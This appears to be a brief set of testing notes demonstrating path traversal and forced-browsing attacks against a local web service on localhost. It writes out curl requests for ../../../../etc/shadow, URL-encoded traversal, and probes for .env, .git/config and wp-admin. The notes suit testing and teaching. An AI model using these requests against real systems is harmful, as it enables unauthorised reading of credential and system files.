postman/ thunder client

## Path Traversal Attack Demonstration
A path traversal attack attempts to access directories or files outside the web root by using ../ sequences.

# Using standard ../
curl http://localhost:8080/api/v1/resource?file=../../../../etc/shadow
# Using URL encoded values (%2e%2e%2f is ../)
curl http://localhost:8080/api/v1/%2e%2e%2f%2e%2e%2fsecret




## Enumeration / Forced Browsing Attack Demonstration
An enumeration attack attempts to guess or find hidden, sensitive files and directories (like .env, .git, etc.).

# Trying to access the .env file
curl http://localhost:8080/.env
# Trying to access the git repository directory
curl http://localhost:8080/.git/config
# Trying to access the wordpress admin panel
curl http://localhost:8080/wp-admin